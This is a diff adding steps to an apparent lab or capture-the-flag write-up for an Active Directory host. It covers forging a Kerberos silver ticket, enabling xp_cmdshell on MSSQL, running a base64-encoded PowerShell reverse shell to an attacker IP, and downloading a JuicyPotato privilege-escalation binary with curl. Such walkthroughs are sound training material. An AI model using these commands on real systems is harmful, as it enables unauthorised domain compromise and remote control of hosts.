@@ -335,10 +335,165 @@ Definition from HackTricks:
 
 <figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
+* Great article on Silver Tickets:
+
+{% embed url="https://adsecurity.org/?p=2011" %}
+
+* We now need to obtain a <mark style="color:yellow;">Domain SID</mark>
+* We can do this with <mark style="color:yellow;">Impacket-getPac</mark>
+
+```
+impacket-getPac -targetUser administrator scrm.local/ksimpson:ksimpson
+
+Domain SID: S-1-5-21-2743207045-1827831105-2542523200
+```
+
+* Now that we have the Domain SID, we need to create the silver ticket
+* We can do this with <mark style="color:yellow;">ticketer.py</mark>
+
+{% code overflow="wrap" %}
+```
+python3 ticketer.py -spn MSSQLSvc/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local
+```
+{% endcode %}
+
+For this <mark style="color:yellow;">command to work, you need the following</mark>:
+
+* SPN
+* User-ID which will always be 500 with Administrator
+* NTLM hash (obtained from SPN) -- Kerberoast
+* Domain SID (obtained from getPac.py)
+* Domain
+
+It will generate a <mark style="color:purple;">ticket called Administrator.ccache</mark>
+
+* Export the variable!
+
+```
+export KRB5CCNAME=Administrator.ccache
+```
+
+Run klist:
+
+```
+klist
+Ticket cache: FILE:Administrator.ccache
+Default principal: Administrator@SCRM.LOCAL
+
+Valid starting       Expires              Service principal
+10/19/2022 20:18:44  10/16/2032 20:18:44  MSSQLSvc/dc1.scrm.local@SCRM.LOCAL
+        renew until 10/16/2032 20:18:44
+```
+
+* Notice how the ticket expires in 10 years
+* The max age is actually 10 hours
+
+We can now authenticate to the MSSQL service using the Silver Ticket we just created:
+
+```
+python3 mssqlclient.py dc1.scrm.local -k
+
+SQL> help
+
+SQL> enable_xp_cmdshell
+
+SQL> xp_cmdshell whoami
+
+scrm\sqlsvc
+
+NULL
+
+SQL>
+```
+
+We can now exploit this and get a reverse shell using a one-liner PowerShell reverse shell!
+
+* The perfect reverse shell in this case would be found in <mark style="color:yellow;">/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1</mark>&#x20;
+* Edit this and remove the comments from it
+  * Be sure to add your tun0 address and port number you want to run a reverse shell on
+
+Convert the Reverse Shell to UTF Little Endian and output it in base64 format:
+
+```
+cat Invoke-PowerShellTcpOneLine.ps1 | iconv -t UTF-16LE | base64 -w 0
+
+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANwAzACcALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA==
+```
+
+* Copy the base64 encoded string
+
+Start a netcat listener on Kali:
+
+```
+nc -lnvp 1337
+```
+
+Go to the SQL Shell:
+
+{% code overflow="wrap" %}
+```
+xp_cmdshell powershell -env JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4ANwAzACcALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgAKAA==
+```
+{% endcode %}
+
+* You now have a reverse shell!
+
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
 ## Privilege Escalation
 
 ### Local enumeration
 
-### PrivEsc vector
+* <mark style="color:yellow;">Since we came from a Windows service, we can see that we have the privilege of SeImpersonatePrivilege</mark>
+
+whoami /priv:
+
+```
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+```
+
+* There are many ways of exploiting this
+* However, the easiest way to do this would be to use the JuicyPotato Exploit!
+
+{% embed url="https://github.com/antonioCoco/JuicyPotatoNG/releases" %}
+Juicy Potato Repo
+{% endembed %}
+
+Read more about Potato Exploits here:
+
+{% embed url="https://decoder.cloud/2017/12/23/the-lonely-potato/" %}
+
+### Transfer Potato Exploit to Windows Target
+
+Unzip the Potato zip file:
+
+```
+unzip JuicyPotatoNG.zip
+
+JuicyPotato.exe
+```
+
+Start an HTTP server on Kali:
+
+```
+python3 -m http.server
+```
+
+Transfer with curl from Windows shell:
+
+```
+curl 10.10.14.73:8000/JuicyPotatoNG.exe -o JP.exe
+```
+
+Execute:
+
+```
+./JP.exe
+
+```
+
+
+
+
 
 ## Proofs
